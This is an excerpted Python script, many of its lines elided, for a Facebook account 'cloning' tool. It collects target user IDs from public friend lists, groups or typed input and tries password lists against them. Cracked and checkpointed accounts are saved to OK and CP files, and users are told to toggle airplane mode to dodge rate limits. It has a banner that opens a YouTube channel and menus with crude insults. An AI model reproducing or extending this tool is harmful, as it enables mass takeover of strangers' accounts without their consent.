...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mMr_Qureshi_xd')
...
def banner():
	clear()
	os.system('xdg-open https://youtube.com/channel/UCRKwrGupyMDZrYlMSLnV9zQ')
	sol()
	ban='''              PUBLIC  CLONINNG  BEST 

     â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—
     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•
     â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘    â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• 
â–ˆâ–ˆ   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘     â•šâ–ˆâ–ˆâ•”â•  
â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ•‘   
 â•šâ•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•      â•šâ•â•   
AUTHOR :MUNEEB ðŸ˜ ANAS
GITHUB I'D: Muneeb39
VERSION:0.01
TEAM:ALONE                                        
 '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tÂ©Â©Â© Extension Suggestions : [green]Cookiedough[white] Â©Â©Â©'))
		...
		print(f'  {x}[{h}â€¢{x}]{h} LOGIN SUCCESSFUL.........!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	gh = 'github.com/Muneeb39'
	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)))
	print(f'â”œâ”€â”€> Your Id : '+str(my_id))
	print(f'â”œâ”€â”€> Your Ip  : {ip}')
	print(f'â”œâ”€â”€> Github   : {gh}')
	print('|')
	print('â”œâ”€â”€> 1. Crack Public ') 
	#print('â”œâ”€â”€> 2. Crack Follower ')
	#print('â”œâ”€â”€> 3. Lapor bug  ')
	print('â”œâ”€â”€> 2. Crack File	')
	#print('â”œâ”€â”€> 5. Hasil Crack  ')
	#print('â”œâ”€â”€> 6. Share posting FB ')
	print('â”œâ”€â”€> 0. Exit       ')
	print('|')
	_____alvino__adijaya_____ = input('\râ”œâ”€â”€> Select : ')
	if _____alvino__adijaya_____ in ['1']:
		...
		print('â”œâ”€â”€> success Logout+Delete Cookies ')
		exit()
	else:
		print('â”œâ”€â”€> Choose the Right Option ')
		back()
def error():
	jalan(f'{sir}â”œâ”€â”€> wait you will be directed to Facebook  {x}')
	time.sleep(4)
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('â”œâ”€â”€> Apni marzi ke hisab se id add kardo  ? : '))
	except ValueError:
		print('â”œâ”€â”€> Enter Dog Figures, Even Huruff ')
		exit()
	if jum<1 or jum>100:
		print('â”œâ”€â”€> Fail Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('â”œâ”€â”€>  target id number daalo '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('|')
		print(f'â”œâ”€â”€> Choose 3ðŸ”¥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('â”œâ”€â”€> Low Signal ')
		back()
	except (KeyError,IOError):
		print(f'â”œâ”€â”€>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	...
	try:
		...
		print('>> Problem Internet Connection')
		exit()
	except (KeyError,IOError):
...
def lah():
	print(f'\n{x}>> Total Collected ids :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}click Enter {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{x}>> Enter Username Or Group Ids : ')
	...
	if berr2=='Enter Facebook':
		print(" Hit Limit, Please Airplane Mode And Try Again..")
		time.sleep(0.5)
		grup()
	elif berr2=='Mistake':
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}â”œâ”€â”€> Currently Collecting Ids ')
	print(f'â”œâ”€â”€> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
	while True:
		try:
			#ua = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36'
			miskinlu = {"user-agent": ua}
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting(): 
	print(f'{x}â”œâ”€â”€> 1. Old ')
	print('â”œâ”€â”€> 2.  New ')
	print('â”œâ”€â”€> 3. Random ')
	print('|')
	hu = input('â”œâ”€â”€> Select : ')
	if hu in ['1','01']:
		...
		print('â”œâ”€â”€>  ')
		exit()
	print('â”œâ”€â”€> 1. Mobile ')
	print('â”œâ”€â”€> 2. Mbasic ')
	print('â”œâ”€â”€> 3. Touch  ')
	print('â”œâ”€â”€> 4. Mtouch ')
	print('|')
	hc = input('â”œâ”€â”€> Select : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('|')
	_jembot_ = input('â”œâ”€â”€> Show app ( Y/t ) ')
	if _jembot_ in ['']:
		print('â”œâ”€â”€> Choose the Right Option ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('â”œâ”€â”€>  Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		...
		pwku=input('â”œâ”€â”€> Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'â”œâ”€â”€>{m}â€¢{k}â€¢{h}â€¢{x} The Sun is Shifting{m}â€¢{k}â€¢{h}â€¢{x} ')
	print('|')
	print(f'â”œâ”€â”€> Hasil {h}OK{x} Saved In : {h}OK/%s {x}'%(okc))
	print(f'â”œâ”€â”€> Hasil {k}CP{x} Saved In: {k}CP/%s {x}'%(cpc))
	print(f'â”œâ”€â”€> Turn On Airplane Mode Every {m}1k{x} Idz\r')
	print('|')
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r%s[JOONTY]%s=>%s  OK:%s CP:%s  %s%s%s   '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
...
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36)','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
